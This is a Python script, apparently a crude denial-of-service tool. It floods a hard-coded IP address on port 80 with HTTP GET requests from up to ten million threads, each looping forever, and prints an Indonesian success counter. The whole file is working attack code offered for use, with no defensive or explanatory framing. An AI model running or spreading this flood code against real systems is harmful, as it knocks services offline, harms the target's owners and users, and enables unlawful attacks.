import socket
import threading

target = "104.21.58.4"
fake_ip = "104.21.58.4"
port = 80

attack_num = 0


def attack():
    while True:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.connect((target, port))
        
        soc.sendto(("GET /"+target+" HTTP/1.1\r\n").encode("ascii"),
                   (target, port))
        
        soc.sendto(("HOST: "+fake_ip+"\r\n\r\n").encode("ascii"),
                   (target, port))
        
        global attack_num
        attack_num += 1
        print(f'Target Telah Berhasil {target} :{attack_num}')
        
        soc.close()
        
for i in range(10000000):
    thread = threading.Thread(target=attack)
    thread.start()